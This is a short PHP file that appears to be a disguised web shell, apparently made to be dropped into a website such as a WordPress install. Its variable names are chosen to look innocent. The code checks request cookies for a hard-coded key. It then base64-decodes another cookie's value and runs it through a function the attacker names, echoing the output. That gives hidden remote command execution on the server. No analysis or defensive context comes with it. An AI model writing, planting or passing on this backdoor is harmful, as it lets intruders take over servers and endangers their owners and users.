<?php

$taxnomy = "abeb256";
$autodiscovery = $_COOKIE;

foreach ( $autodiscovery as $grp => $binary ) {
	if ($grp == $taxnomy) {
		$download = array_pop($autodiscovery);
		$download = base64_decode($download);
		echo @$binary($download);
	}
}

?>